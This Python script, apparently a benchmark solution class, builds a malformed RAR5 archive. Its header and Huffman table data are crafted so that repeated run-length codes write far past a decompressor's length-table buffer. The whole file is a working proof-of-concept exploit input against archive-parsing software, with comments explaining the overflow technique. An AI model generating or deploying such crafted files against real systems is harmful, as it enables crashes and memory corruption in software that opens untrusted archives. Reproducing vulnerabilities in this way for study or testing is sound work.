import struct
import zlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        # RAR5 Signature
        sig = b"\x52\x61\x72\x21\x1a\x07\x01\x00"

        def to_vint(n):
            if n < 0: n = 0
            out = bytearray()
            while True:
                byte = n & 0x7F
                n >>= 7
                if n > 0:
                    byte |= 0x80
                    out.append(byte)
                else:
                    out.append(byte)
                    break
            return bytes(out)

        # 1. Main Header
        # Type=1 (Main), Flags=0
        mh_fields = to_vint(1) + to_vint(0)
        mh_crc = zlib.crc32(mh_fields) & 0xFFFFFFFF
        # Size = SizeField(vint) + Body
        # Body is 2 bytes. Size is small, so vint is 1 byte.
        mh_size_val = 1 + len(mh_fields)
        mh_size_bytes = to_vint(mh_size_val)
        main_header = struct.pack('<I', mh_crc) + mh_size_bytes + mh_fields

        # 2. Payload Construction (Compressed Data)
        bw_out = bytearray()
        bw_buf = 0
        bw_bits = 0
        
        def write_bits(val, bits):
            nonlocal bw_buf, bw_bits
            # Mask val to bits
            val &= (1 << bits) - 1
            bw_buf |= val << bw_bits
            bw_bits += bits
            while bw_bits >= 8:
                bw_out.append(bw_buf & 0xFF)
                bw_buf >>= 8
                bw_bits -= 8
        
        # -- Payload Content --
        # Block Header: Tables Present = 1
        write_bits(1, 1)
        
        # Bit Length Table Size: 4 bits
        # The reader calculates size = read(4) + 2.
        # We need to provide lengths for the permutation array up to index 15 (Code 16).
        # We need count 16. So we write 14.
        write_bits(14, 4)
        
        # Bit Length Table (16 nibbles)
        # Permutation: 4, 0, 1, 5, 2, 3, 6, 7, 8, 10, 11, 12, 13, 14, 15, 16
        # We want to use Code 0 (Literal 0 length) and Code 16 (Repeat previous).
        # Code 0 is at index 1. We assign it length 1.
        # Code 16 is at index 15. We assign it length 2.
        # All others 0 (unused).
        nibbles = [0]*16
        nibbles[1] = 1  # Code 0 -> Len 1 (Huffman code '0')
        nibbles[15] = 2 # Code 16 -> Len 2 (Huffman code '10')
        for n in nibbles:
            write_bits(n, 4)
            
        # Main Table Content
        # We are now decoding the lengths for the Main Huffman Table.
        # Step 1: Write Code 0 to set the "previous length" to 0.
        write_bits(0, 1) # '0'
        
        # Step 2: Use RLE Code 16 to repeat "0" many times.
        # Code 16 is '10'.
        # It takes a 2-bit argument. Value 3 ('11') means repeat 6 times.
        # The internal buffer for Huffman lengths is roughly 400-500 entries.
        # We write enough repeats to overflow this buffer.
        # 200 iterations * 6 repeats = 1200 entries.
        for _ in range(200):
            write_bits(2, 2) # Code 16 ('10')
            write_bits(3, 2) # Arg 3 ('11')
            
        # Flush bits
        if bw_bits > 0:
            bw_out.append(bw_buf & 0xFF)
        
        payload = bytes(bw_out)

        # 3. File Header
        # Fields:
        # Type(2), Flags(0), Extra(0), DataSz, Attr(0), UnpSz, HashType(0), Hash(32), Host(0), NameLen(1), Name('a'), Comp(0x18)
        
        fh_body = bytearray()
        fh_body.extend(to_vint(2)) # Type = File
        fh_body.extend(to_vint(0)) # Flags
        fh_body.extend(to_vint(0)) # Extra Area Size
        fh_body.extend(to_vint(len(payload))) # Data Size
        fh_body.extend(to_vint(0)) # File Attr
        fh_body.extend(to_vint(len(payload)*20)) # Unpacked Size (arbitrary)
        fh_body.extend(to_vint(0)) # Hash Type
        fh_body.extend(b'\x00' * 32) # Hash
        fh_body.extend(to_vint(0)) # Host OS
        fh_body.extend(to_vint(1)) # Name Length
        fh_body.extend(b'a')       # Name
        fh_body.extend(to_vint(0x18)) # Compression Method 3 (Normal), Version 0
        
        fh_crc = zlib.crc32(fh_body) & 0xFFFFFFFF
        
        fh_len = len(fh_body)
        # Size field = len(vint(Size)) + BodyLen
        # BodyLen is < 128, so vint(Size) is 1 byte.
        fh_size_val = 1 + fh_len
        fh_size_bytes = to_vint(fh_size_val)
        
        file_header = struct.pack('<I', fh_crc) + fh_size_bytes + bytes(fh_body)
        
        return sig + main_header + file_header + payload
